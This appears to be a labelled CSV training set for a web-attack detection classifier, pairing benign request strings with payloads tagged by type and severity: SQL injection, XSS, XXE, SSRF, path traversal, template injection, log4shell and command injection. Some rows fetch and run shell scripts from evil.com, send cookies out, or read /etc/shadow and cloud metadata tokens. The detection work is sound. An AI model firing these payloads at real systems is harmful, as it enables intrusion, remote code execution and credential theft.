text,label,attack_type,severity
Referer: http://target.com/?q=%3C?xml?%3E%3C!DOCTYPE%20foo%20[%3C!ENTITY%20xxe%20SYSTEM%20%22file:///proc/self/environ%22%3E]%3E,1,xxe,high
X-Forwarded-For: xmlns:xi=%22http://www.w3.org/2001/XInclude%22%3E%3Cxi:include%20parse=%22text%22%20href=%22file:///etc/passwd%22/%3E,1,xxe,high
"POST /api/data HTTP/1.1
Host: target.com

input=%3Cinput%20autofocus%20onfocus=alert%281%29%3E",1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=$%28ls%20-la%29",1,command_injection,critical
"GET /search?input=1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64-- HTTP/1.1
Host: target.com",1,sql_injection,high
User-Agent: ../../etc/passwd,1,path_traversal,medium
"GET /search?input=username=&password=password HTTP/1.1
Host: target.com",1,brute_force,low
Referer: http://target.com/?q=username=admin&password=123456,1,brute_force,low
delete item id=xlsx,0,normal,none
"GET /search?input=http://spoofed.burpcollaborator.net HTTP/1.1
Host: target.com",1,ssrf,high
User-Agent: callback=http://internal-service/secret,1,ssrf,high
export report csv,0,normal,none
User-Agent: ../../../../etc/passwd,1,path_traversal,medium
"GET /search?input=http://169.254.169.254/computeMetadata/v1/ HTTP/1.1
Host: target.com",1,ssrf,high
X-Forwarded-For: ; whoami,1,command_injection,critical
"GET /search?input=../../../../var/www/html/config.php HTTP/1.1
Host: target.com",1,path_traversal,medium
"GET /page?id=file:///c:/boot.ini HTTP/1.1
Host: target.com",1,path_traversal,medium
User-Agent: ${jndi:ldap://169.254.169.254/a},1,log4shell,critical
"GET /page?id=php://filter/convert.base64-encode/resource=/etc/passwd HTTP/1.1
Host: target.com",1,path_traversal,medium
delete item id=ar,0,normal,none
upload image photo_john_doe.jpg,0,normal,none
load data from summary-q3,0,normal,none
POST /api/cart add item=2025,0,normal,none
"POST /api/feedback body={{""message"":""alice""}}",0,normal,none
X-Forwarded-For: Authorization:%20Basic%20YWRtaW46YWRtaW4=,1,brute_force,low
X-Forwarded-For: ;%20wget%20http://evil.com/shell.sh%20-O%20/tmp/shell.sh%20&&%20bash%20/tmp/shell.sh,1,command_injection,critical
"POST /api/data HTTP/1.1
Host: target.com

input=Authorization: Basic cm9vdDpyb290",1,brute_force,low
X-Forwarded-For: %22%3E%3Cimg%20src=x%20onerror=alert%281%29%3E,1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=User-Agent:%20${jndi:ldap://evil.com/a}",1,log4shell,critical
GET /api/status?service=contact,0,normal,none
User-Agent: ;%20echo%20%27hacked%27%20%3E%20/tmp/pwned,1,command_injection,critical
X-Forwarded-For: | netstat -an,1,command_injection,critical
"GET /page?id=ftp://127.0.0.1:21 HTTP/1.1
Host: target.com",1,ssrf,high
User-Agent: {{''.__class__.__base__.__subclasses__()}},1,ssti,high
search query for services,0,normal,none
download file home.pdf,0,normal,none
"GET /page?id=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E HTTP/1.1
Host: target.com",1,xss,medium
; env,1,command_injection,critical
sort items by size ascending,0,normal,none
GET /api/status?service=bob,0,normal,none
Referer: http://target.com/?q=|%20ls%20-la,1,command_injection,critical
Referer: http://target.com/?q={{range.constructor%28%27return%20global.process.mainModule.require%28%22child_process%22%29.execSync%28%22id%22%29%27%29%28%29}},1,ssti,high
GET /products/order-12345 HTTP/1.1,0,normal,none
X-Forwarded-For: ${jndi:ldap://evil.%63om/a},1,log4shell,critical
"POST /api/data HTTP/1.1
Host: target.com

input=<body onload=alert(1)>",1,xss,medium
User-Agent: ../../../etc/passwd,1,path_traversal,medium
"POST /api/orders body={{""item"":""en""}}",0,normal,none
"GET /page?id=| crontab -l HTTP/1.1
Host: target.com",1,command_injection,critical
"POST /api/data HTTP/1.1
Host: target.com

input=%22%3E%3Cimg%20src=x%20onerror=alert%281%29%3E",1,xss,medium
Referer: http://target.com/?q=%3Cselect%20onchange=alert%281%29%3E%3Coption%3E1%3C/option%3E%3C/select%3E,1,xss,medium
X-Forwarded-For: %3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E,1,xss,medium
' OR '1'='1'--,1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input=%0a ls -la",1,command_injection,critical
"GET /page?id=/var/www/../../etc/passwd HTTP/1.1
Host: target.com",1,path_traversal,medium
Referer: http://target.com/?q=<input autofocus onfocus=alert(1)>,1,xss,medium
next=http://127.0.0.1:8080,1,ssrf,high
"GET /page?id=id=1' AND '1'='1 HTTP/1.1
Host: target.com",1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input=${j${::-n}di:ldap://evil.com/a}",1,log4shell,critical
PUT /api/users/10/settings,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=http://0.0.0.0/",1,ssrf,high
X-Forwarded-For: id=1%27%20AND%20%271%27=%271,1,sql_injection,high
"X-Forwarded-For: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM ""http://evil.com/evil.dtd""> %xxe;]>",1,xxe,high
"GET /search?input=%27%20UNION%20SELECT%20NULL,NULL-- HTTP/1.1
Host: target.com",1,sql_injection,high
"GET /search?input=php://filter/convert.base64-encode/resource=/etc/passwd HTTP/1.1
Host: target.com",1,path_traversal,medium
"GET /page?id=%3Cimg%20src=x%20onerror=alert%28%27XSS%27%29%3E HTTP/1.1
Host: target.com",1,xss,medium
"POST /api/feedback body={{""message"":""home""}}",0,normal,none
export report web-development,0,normal,none
load data from laptops,0,normal,none
GET /search?q=1&page=1,0,normal,none
"GET /page?id=admin%27-- HTTP/1.1
Host: target.com",1,sql_injection,high
search query for 10,0,normal,none
Referer: http://target.com/?q=%3Cinput%20autofocus%20onfocus=alert%281%29%3E,1,xss,medium
"User-Agent: %3C!DOCTYPE%20test%20[%20%3C!ENTITY%20%%20init%20SYSTEM%20%22data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk%22%3E%20%init;%20]%3E%3Cfoo/%3E",1,xxe,high
PUT /api/users/de/settings,0,normal,none
"GET /page?id=dict://127.0.0.1:6379/info HTTP/1.1
Host: target.com",1,ssrf,high
delete item id=february,0,normal,none
User-Agent: %3C?xml%20version=%221.0%22?%3E%3C!DOCTYPE%20foo%20[%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E]%3E%3Cfoo%3E&xxe;%3C/foo%3E,1,xxe,high
"GET /page?id=<link rel=import href=javascript:alert(1)> HTTP/1.1
Host: target.com",1,xss,medium
"content-type: application/json
body: {{""name"":""products""}}",0,normal,none
GET /docs/date.html,0,normal,none
search query for john_doe,0,normal,none
"GET /search?input=search=' OR 1=1--&submit=Search HTTP/1.1
Host: target.com",1,sql_injection,high
load data from fr,0,normal,none
Referer: http://target.com/?q=username=admin&password=admin123,1,brute_force,low
"GET /page?id=xmlns:xi=%22http://www.w3.org/2001/XInclude%22%3E%3Cxi:include%20parse=%22text%22%20href=%22file:///etc/passwd%22/%3E HTTP/1.1
Host: target.com",1,xxe,high
POST /api/cart add item=10,0,normal,none
"GET /page?id=username=hadoop&password=hadoop HTTP/1.1
Host: target.com",1,brute_force,low
"GET /search?input=;%20ps%20aux HTTP/1.1
Host: target.com",1,command_injection,critical
"POST /api/data HTTP/1.1
Host: target.com

input=<img src=x onerror=alert(1)>",1,xss,medium
Referer: http://target.com/?q=1%27%20ORDER%20BY%2010--,1,sql_injection,high
"GET /search?input=%27%20UNION%20SELECT%20NULL,NULL-- HTTP/1.1
Host: target.com",1,sql_injection,high
gopher://127.0.0.1:6379/_INFO,1,ssrf,high
download file about.pdf,0,normal,none
"GET /page?id=<div style='background:url(javascript:alert(1))'> HTTP/1.1
Host: target.com",1,xss,medium
User-Agent: user=oracle&password=oracle,1,brute_force,low
"content-type: application/json
body: {{""name"":""green""}}",0,normal,none
"GET /search?input=& cat /etc/passwd HTTP/1.1
Host: target.com",1,command_injection,critical
User-Agent: ${jndi:${lower:l}${lower:d}a${lower:p}://evil.com/a},1,log4shell,critical
"POST /api/data HTTP/1.1
Host: target.com

input=%27%20OR%20BENCHMARK%281000000,MD5%28%27a%27%29%29--",1,sql_injection,high
"GET /search?input=http://127.0.0.1#evil.com HTTP/1.1
Host: target.com",1,ssrf,high
"GET /search?input=http://metadata.google.internal/computeMetadata/v1/ HTTP/1.1
Host: target.com",1,ssrf,high
expression%28alert%281%29%29,1,xss,medium
User-Agent: zip://path/to/file.zip#file.php,1,path_traversal,medium
username=data-science&action=login,0,normal,none
edit comment id=user123,0,normal,none
|%20ifconfig,1,command_injection,critical
download file mobile-apps.pdf,0,normal,none
GET /blog/january HTTP/1.1,0,normal,none
GET /category/10/items,0,normal,none
username=data-science&action=login,0,normal,none
<svg onload=alert(document.domain)>,1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=1' AND SLEEP(5)--",1,sql_injection,high
PUT /api/users/de/settings,0,normal,none
username=sa&password=sa,1,brute_force,low
"POST /api/data HTTP/1.1
Host: target.com

input=| chmod +s /bin/bash",1,command_injection,critical
"GET /page?id=%3Clink%20rel=import%20href=javascript:alert%281%29%3E HTTP/1.1
Host: target.com",1,xss,medium
X-Forwarded-For: admin'--,1,sql_injection,high
"X-Forwarded-For: %27%20UNION%20SELECT%20NULL,NULL--",1,sql_injection,high
X-Forwarded-For: /etc/passwd%00,1,path_traversal,medium
"GET /page?id=User-Agent:%20${jndi:ldap://evil.com/a} HTTP/1.1
Host: target.com",1,log4shell,critical
"GET /search?input=' OR 1=1/* HTTP/1.1
Host: target.com",1,sql_injection,high
User-Agent: %3C!DOCTYPE%20foo%20[%3C!ENTITY%20%%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20%3C!ENTITY%20%%20load%20SYSTEM%20%22php://filter/read=convert.base64-encode/resource=file:///etc/passwd%22%3E]%3E,1,xxe,high
"GET /search?input=1' ORDER BY 10-- HTTP/1.1
Host: target.com",1,sql_injection,high
User-Agent: %3Csvg%20onload=alert%281%29%3E,1,xss,medium
username=user&password=user,1,brute_force,low
"GET /search?input=/etc/passwd%00 HTTP/1.1
Host: target.com",1,path_traversal,medium
User-Agent: '; EXEC xp_cmdshell('whoami')--,1,sql_injection,high
download file february.pdf,0,normal,none
"Referer: http://target.com/?q=<?xml?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///proc/self/environ"">]>",1,xxe,high
"GET /search?input=login=admin&pass=admin HTTP/1.1
Host: target.com",1,brute_force,low
"POST /api/data HTTP/1.1
Host: target.com

input=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",1,ssrf,high
Referer: http://target.com/?q=search=' OR 1=1--&submit=Search,1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E",1,xss,medium
GET /api/status?service=alice,0,normal,none
X-Forwarded-For: /etc/passwd%00.php,1,path_traversal,medium
"POST /api/data HTTP/1.1
Host: target.com

input=%26%26id",1,command_injection,critical
GET /api/status?service=name,0,normal,none
search query for jane_smith,0,normal,none
../../../../etc/passwd,1,path_traversal,medium
X-Api-Version:%20${jndi:ldap://evil.com/a},1,log4shell,critical
GET /api/status?service=xlsx,0,normal,none
search query for red,0,normal,none
http://192.168.1.1/admin,1,ssrf,high
X-Forwarded-For: #set%28$x=%27%27%29#set%28$rt=$x.class.forName%28%27java.lang.Runtime%27%29%29#set%28$chr=$x.class.forName%28%27java.lang.Character%27%29%29#set%28$str=$x.class.forName%28%27java.lang.String%27%29%29#set%28$ex=$rt.getRuntime%28%29.exec%28%27id%27%29%29$ex.waitFor%28%29,1,ssti,high
Referer: http://target.com/?q=expect://id,1,path_traversal,medium
"POST /api/orders body={{""item"":""green""}}",0,normal,none
search query for laptops,0,normal,none
"<!DOCTYPE foo [<!ENTITY xxe ""test""> <!ENTITY xxe2 ""&xxe;&xxe;&xxe;"">]>",1,xxe,high
Referer: http://target.com/?q=${jndi:ldap://evil.com/${java:os}},1,log4shell,critical
X-Forwarded-For: $%28env%29,1,command_injection,critical
User-Agent: ftp://127.0.0.1:21,1,ssrf,high
"GET /page?id=username=admin&password=%27%20OR%20%271%27=%271 HTTP/1.1
Host: target.com",1,sql_injection,high
User-Agent: ;%20curl%20http://evil.com/shell.sh%20|%20bash,1,command_injection,critical
"User-Agent: <?xml version=""1.0""?><!DOCTYPE data [<!ELEMENT data ANY><!ENTITY file SYSTEM ""file:///etc/passwd"">]><data>&file;</data>",1,xxe,high
<svg onload=alert(document.domain)>,1,xss,medium
GET /category/2/items,0,normal,none
Referer: http://target.com/?q=%3Csvg%20onload=alert%281%29%3E,1,xss,medium
X-Forwarded-For: %3Cbase%20href=%27javascript:alert%281%29//%27%3E%3Ca%20href=/%3Eclick%3C/a%3E,1,xss,medium
"GET /search?input=#{7*7} HTTP/1.1
Host: target.com",1,ssti,high
sort items by pdf ascending,0,normal,none
"GET /page?id=../../../../etc/passwd%00 HTTP/1.1
Host: target.com",1,path_traversal,medium
"POST /api/data HTTP/1.1
Host: target.com

input=%27;%20EXEC%20xp_cmdshell%28%27whoami%27%29--",1,sql_injection,high
Referer: http://target.com/?q=' OR 'x'='x,1,sql_injection,high
sort items by green ascending,0,normal,none
"GET /page?id=| cat /etc/shadow HTTP/1.1
Host: target.com",1,command_injection,critical
username=database&action=login,0,normal,none
"GET /page?id=<script>fetch('http://evil.com?c='+btoa(document.cookie))</script> HTTP/1.1
Host: target.com",1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=%3C!DOCTYPE%20foo%20[%3C!ENTITY%20%%20xxe%20SYSTEM%20%22http://evil.com/evil.dtd%22%3E%20%xxe;]%3E",1,xxe,high
"POST /api/feedback body={{""message"":""mobile-apps""}}",0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=%27%20HAVING%201=1--",1,sql_injection,high
%3Cbody%20onload=alert%281%29%3E,1,xss,medium
"GET /search?input=zip://path/to/file.zip#file.php HTTP/1.1
Host: target.com",1,path_traversal,medium
%3Cimg%20src=x%20onerror=alert%28%27XSS%27%29%3E,1,xss,medium
X-Forwarded-For: %3Cvideo%20src=x%20onerror=alert%281%29%3E,1,xss,medium
Referer: http://target.com/?q=/var/www/../../etc/passwd,1,path_traversal,medium
"POST /api/data HTTP/1.1
Host: target.com

input=Authorization:%20Basic%20YWRtaW46YWRtaW4=",1,brute_force,low
"POST /api/data HTTP/1.1
Host: target.com

input=|%20ifconfig",1,command_injection,critical
%3C?xml%20version=%221.0%22?%3E%3C!DOCTYPE%20foo%20[%3C!ENTITY%20xxe%20SYSTEM%20%22http://evil.com/xxe%22%3E]%3E%3Cfoo%3E&xxe;%3C/foo%3E,1,xxe,high
GET /search?q=invoice-2024&page=1,0,normal,none
sort items by ar ascending,0,normal,none
Referer: http://target.com/?q=username=sa&password=sa,1,brute_force,low
"POST /api/data HTTP/1.1
Host: target.com

input=%27%20OR%201=1%20LIMIT%201--",1,sql_injection,high
%22%3E%3Cimg%20src=x%20onerror=alert%281%29%3E,1,xss,medium
"GET /page?id=http://localhost:8080/manager HTTP/1.1
Host: target.com",1,ssrf,high
User-Agent: 1%20OR%201=1/*,1,sql_injection,high
POST /api/cart add item=products,0,normal,none
User-Agent: %3Cselect%20onchange=alert%281%29%3E%3Coption%3E1%3C/option%3E%3C/select%3E,1,xss,medium
GET /blog/100 HTTP/1.1,0,normal,none
"1 AND (SELECT SUBSTRING(username,1,1) FROM users WHERE username='admin')='a'",1,sql_injection,high
User-Agent: | cat /etc/passwd,1,command_injection,critical
Referer: http://target.com/?q=%3C?xml?%3E%3C!DOCTYPE%20foo%20[%3C!ENTITY%20xxe%20SYSTEM%20%22file:///proc/self/environ%22%3E]%3E,1,xxe,high
"GET /page?id=%3Csvg%20onload=alert%281%29%3E HTTP/1.1
Host: target.com",1,xss,medium
%27;%20UPDATE%20users%20SET%20password=%27hacked%27%20WHERE%20%271%27=%271%27--,1,sql_injection,high
User-Agent: `ls%20-la`,1,command_injection,critical
User-Agent: file:///etc/shadow,1,path_traversal,medium
filter results by category=de,0,normal,none
"GET /search?input=User-Agent:%20${jndi:ldap://evil.com/a} HTTP/1.1
Host: target.com",1,log4shell,critical
Referer: http://target.com/?q=;%20cat%20/etc/shadow,1,command_injection,critical
"GET /search?input=1%27%20ORDER%20BY%201-- HTTP/1.1
Host: target.com",1,sql_injection,high
"GET /search?input=username=jenkins&password=jenkins HTTP/1.1
Host: target.com",1,brute_force,low
<IMG SRC=javascript:alert('XSS')>,1,xss,medium
"GET /search?input=search=' OR 1=1--&submit=Search HTTP/1.1
Host: target.com",1,sql_injection,high
edit comment id=about,0,normal,none
User-Agent: ;%20env,1,command_injection,critical
PUT /api/users/alice/settings,0,normal,none
"%27%20UNION%20SELECT%20NULL,NULL,NULL--",1,sql_injection,high
"GET /search?input=%26%26id HTTP/1.1
Host: target.com",1,command_injection,critical
view page number electronics,0,normal,none
http://127.0.0.1:6379,1,ssrf,high
User-Agent: username=superuser&password=superuser,1,brute_force,low
sort items by 2025 ascending,0,normal,none
"X-Forwarded-For: 1' UNION ALL SELECT NULL,NULL,NULL--",1,sql_injection,high
"GET /search?input=http://127.0.0.1#evil.com HTTP/1.1
Host: target.com",1,ssrf,high
"POST /api/data HTTP/1.1
Host: target.com

input=;%20cat%20/etc/passwd",1,command_injection,critical
User-Agent: %3CIMG%20SRC=javascript:alert%28%27XSS%27%29%3E,1,xss,medium
X-Api-Version:%20${jndi:ldap://evil.com/a},1,log4shell,critical
delete item id=fr,0,normal,none
"content-type: application/json
body: {{""name"":""blue""}}",0,normal,none
User-Agent: %22%3E%3Cimg%20src=x%20onerror=alert%281%29%3E,1,xss,medium
user=user1&pass=pass1,1,brute_force,low
X-Forwarded-For: php://filter/convert.base64-encode/resource=/etc/passwd,1,path_traversal,medium
{{''|attr('__class__')|attr('__base__')|attr('__subclasses__')()}},1,ssti,high
"GET /page?id=%27%20AND%201=%28SELECT%20COUNT%28*%29%20FROM%20tabname%29;%20-- HTTP/1.1
Host: target.com",1,sql_injection,high
filter results by category=25,0,normal,none
"GET /page?id=%3Cimg%20src=x%20onerror=alert%28%27XSS%27%29%3E HTTP/1.1
Host: target.com",1,xss,medium
"GET /search?input=gopher://127.0.0.1:6379/_INFO HTTP/1.1
Host: target.com",1,ssrf,high
GET /products/2025 HTTP/1.1,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=../../../../proc/self/environ",1,path_traversal,medium
"POST /api/data HTTP/1.1
Host: target.com

input=user=admin&pwd=password",1,brute_force,low
upload image photo_json.jpg,0,normal,none
GET /products/2024 HTTP/1.1,0,normal,none
User-Agent: {{range.constructor%28%27return%20global.process.mainModule.require%28%22child_process%22%29.execSync%28%22id%22%29%27%29%28%29}},1,ssti,high
"POST /api/data HTTP/1.1
Host: target.com

input=%3Cform%20action=%27javascript:alert%281%29%27%3E%3Cinput%20type=submit%3E%3C/form%3E",1,xss,medium
Referer: http://target.com/?q=username=info&password=info,1,brute_force,low
Referer: http://target.com/?q=<body onload=alert(1)>,1,xss,medium
load data from 100,0,normal,none
"GET /search?input=http://127.0.0.1#evil.com HTTP/1.1
Host: target.com",1,ssrf,high
sort items by red ascending,0,normal,none
Referer: http://target.com/?q=127.0.0.1%20&&%20whoami,1,command_injection,critical
X-Forwarded-For: %3Cvideo%20src=x%20onerror=alert%281%29%3E,1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=%3Cimg%20src=x%20onerror=alert%28%27XSS%27%29%3E",1,xss,medium
"content-type: application/json
body: {{""name"":""fr""}}",0,normal,none
"GET /page?id=javascript:alert(document.cookie) HTTP/1.1
Host: target.com",1,xss,medium
Referer: http://target.com/?q=%3Cdiv%20style=%27background:url%28javascript:alert%281%29%29%27%3E,1,xss,medium
X-Forwarded-For: %3Cform%20action=%27javascript:alert%281%29%27%3E%3Cinput%20type=submit%3E%3C/form%3E,1,xss,medium
../../../../etc/passwd%00,1,path_traversal,medium
User-Agent: |%20ls%20-la,1,command_injection,critical
